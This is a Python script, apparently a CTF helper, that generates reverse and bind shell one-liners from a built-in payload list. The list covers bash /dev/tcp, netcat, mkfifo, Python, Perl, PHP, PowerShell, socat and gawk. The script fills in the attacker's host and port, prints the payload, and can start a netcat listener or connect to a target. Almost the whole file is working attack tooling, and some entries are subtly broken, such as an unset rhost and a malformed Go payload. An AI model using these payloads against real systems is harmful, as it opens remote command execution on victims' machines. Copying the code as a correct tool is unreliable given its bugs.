#!/usr/bin/env python3
"""
Shell Generator for CTF's
"""
import argparse,sys, os, psutil

class shellgen():
    def __init__(self):
        self.lport = 9001
        self.rport = 80
        self.lhost = '0.0.0.0'
        self.rport = '127.0.0.1'
        self.interface = 'lo'
        self.shells= [{'name':'reverse_powershell','type':'reverse','cmd':'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'},
                 {'name':'reverse_bash','type':'reverse','cmd':'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'},
                 {'name':'reverse_perl','type':'reverse','cmd':'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''},
                 {'name':'reverse_python','type':'reverse','cmd':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''},
                 {'name':'reverse_php','type':'reverse','cmd':'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\''},
                 {'name':'reverse_ruby','type':'reverse','cmd':'ruby -rsocket -e\'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''},
                 {'name':'reverse_netcat','type':'reverse','cmd':'nc -e /bin/sh LHOST LPORT'},
                 {'name':'reverse_mkfifo','type':'reverse','cmd':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f'},
                 {'name':'reverse_java','type':'reverse','cmd':'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()'},
                 {'name':'reverse_bash_2','type':'reverse','cmd':'0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196'},
                 {'name':'reverse_mknod_telnet','type':'reverse','cmd':'rm -f /tmp/p; mknod /tmp/p p && telnet LHOST LPORT 0/tmp/p'},
                 {'name':'reverse_telnet','type':'reverse','cmd':'telnet LHOST 4444 | /bin/bash | telnet LHOST 4445'},
                 {'name':'bind_powershell','type':'bind','cmd':'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(\'0.0.0.0\',RPORT);$listener.start();$client =$listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"'},
                 {'name':'reverse_powercat','type':'reverse','cmd':'powercat -c LHOST -p LPORT -e cmd.exe'},
                 {'name':'bind_powercat','type':'bind','cmd':'powercat -l 0.0.0.0 -p RPORT -e cmd.exe'},
                 {'name':'reverse_socat','type':'reverse','cmd':'socat tcp:LHOST:LPORT exec:\'bash -i\' ,pty,stderr,setsid,sigint,sane &'},
                 {'name':'reverse_go','type':'reverse','cmd':'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}\'>/tmp/sh.go&&go run /tmp/sh.go'},
                 {'name':'reverse_php_bash','type':'reverse','cmd':'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1\'");?>'},
                 {'name':'reverse_netcat_sh','type':'reverse','cmd':'/bin/sh | nc LHOST LPORT'},
                 {'name':'reverse_nodejs','type':'reverse','cmd':'require(\'child_process\').exec(\'bash -i >& /dev/tcp/10.0.0.1/80 0>&1\');'},
                 {'name':'reverse_perl_win','type':'reverse','cmd':'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''},
                 {'name':'reverse_gawk','type':'reverse','cmd':'gawk \'BEGIN {P=LPORT;S="> ";H="LHOST";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}\''},
                 ]
        
    
    # Getters of the class
    def get_lport(self):
        return self.lport
    def get_rport(self):
        return self.rport
    def get_lhost(self):
        return self.lhost
    def get_rhost(self):
        return self.rhost

    # Setters of the class
    def set_lport(self,lport):
        self.lport = lport
    def set_rport(self,rport):
        self.rport = rport
    def set_lhost(self,lhost):
        self.lhost = lhost
    def set_rhost(self,rhost):
        self.rhost = rhost
    def set_interface(self,iface_name):
        self.interface = iface_name
        iface = self._get_interface(iface_name)
        if iface != None:
            self.set_lhost(iface[0][1]) # set up the interface address
        
    # Public methods
    def generate_shell(self,name='',**shellargs):
        """
        This method is generate a desired shell with values
        """
        for key, value in shellargs.items():
            if key == 'lport': self.set_lport(value)
            elif key == 'lhost':self.set_lhost(value)
            elif key == 'rport':self.set_rport(value)
            elif key == 'rhost':self.set_rhost(value)
        so = self._get_shell(name) # Shell Object
        if so != None:
            shell_string = self._create_shell_string(so) # create a string
            return shell_string
        else:
            raise Exception('Shell Object cannot be None!')
            
    def list_shells(self):
        """
        List available shells in the module
        """
        for s in self.shells:
            print(f"{s['name']}{self._calculate_empty_space(s['name'])}{s['type']}")
    def list_interfaces(self):
        """
        Lista all available Interfaces and associated addresses.
        """
        
        addrs = psutil.net_if_addrs()
        for k,v in addrs.items():
            print(f"Interface: {k} {' '*(7-len(k))}{v[0][1]}")
        
        
        
    def listen(self):
        """
        Listening on the predefined interface and port
        Catch the incoming shell connection
        """
        cmd = f'nc -l {self.lhost} -vnp {self.lport}'
        os.system(cmd)
    def connect(self):
        """
        Connect to bind shell
        """
        input('Press ENTER to Connect!')
        cmd = f'nc {self.rhost} {self.rport}'
        os.system(cmd)
    # Private methods
    def _get_shell(self,shellname):
        """
        Get the shell object from the list by name.
        """
        for s in self.shells:
            if s['name'].lower() == shellname.lower():
                return s
        return None
    def _create_shell_string(self,shell_obj):
        if shell_obj != None:
            shell_type = shell_obj['type']
            if shell_type == 'reverse':
                # in reverse strings use lport and lhost
                shell_string = shell_obj['cmd']
                shell_string = shell_string.replace('LHOST',self.lhost).replace('LPORT',str(self.lport))
                return shell_string
                
            else:
                # in bind strings use rport and rhost
                shell_string = shell_obj['cmd']
                shell_string = shell_string.replace('RHOST',self.rhost).replace('RPORT',str(self.rport))
                return shell_string
        else:
            raise Exception('Shell Object cannot be None!')
        
    
    def _calculate_empty_space(self,shell_name):
        """
        Calculate SPACES for list_shells() method.
        """
        maxlen = 25
        remained = maxlen - len(shell_name)
        return ' '*remained
    
        
    def _get_interfaces(self):
        """
        Return the OS network interfaces
        """
        addrs = psutil.net_if_addrs()
        return addrs.items()
    def _get_interface(self,name):
        """
        Return the OS network interface with a specified name
        """
        addrs = psutil.net_if_addrs()
        for k,v in addrs.items():
            if k == name:
                return v
        return None
        

def parse_parameters():
    """
    Parsing the given CLI parameters
    """
    parser = argparse.ArgumentParser() 
    parser.add_argument('-s','--shell',dest='shell',help='The name of the given SHELL')
    parser.add_argument('-I','--list-interfaces',dest='listifaces',action='store_true',help='List the available interfaces')
    parser.add_argument('-L','--list-shells',action='store_true',dest='listshells',help='List all available shells')
    parser.add_argument('--connect',action='store_true',dest='connect',help='Connect to the bind target')
    parser.add_argument('--listen',action='store_true',help='Listen on given Interface and port')
    parser.add_argument('--rhost',help='The remote host address')
    parser.add_argument('--rport',help='The remote host port')
    parser.add_argument('--lhost',help='The local listening address')
    parser.add_argument('--lport',help='The local listening port')
    parser.add_argument('-i','--interface',dest='interface',help='Set the interface')

                
    args = parser.parse_args()
    return args
    
def main():
    args = parse_parameters()
    
    sh = shellgen()
    shellname = ''
    is_listen = False
    is_connect = False
    
    # Setting up the values
    if args.listifaces: sh.list_interfaces(); sys.exit(0)
    if args.listshells: sh.list_shells(); sys.exit(0)
    if args.shell: shellname = args.shell
    if args.listen: is_listen = True
    if args.connect: is_connect = True
    if args.rport: sh.set_rport(args.rport)
    if args.rhost: sh.set_rhost(args.rhost)
    if args.lport: sh.set_lport(args.lport)
    if args.lhost: sh.set_lhost(args.lhost)
    if args.interface: sh.set_interface(args.interface)
    
    if shellname != '':
        generated_shell = sh.generate_shell(shellname)
        print(generated_shell)
    else:
        print('Shell name cannot be null, please specify one!')
        #sh.list_shells()
    
    if is_listen:
        print("[*] Starting Netcat listener..")
        sh.listen()
    if is_connect:
        print("[*] Connect to the target..")
        sh.connect()
        
    
    
    
if __name__ == '__main__':
    main()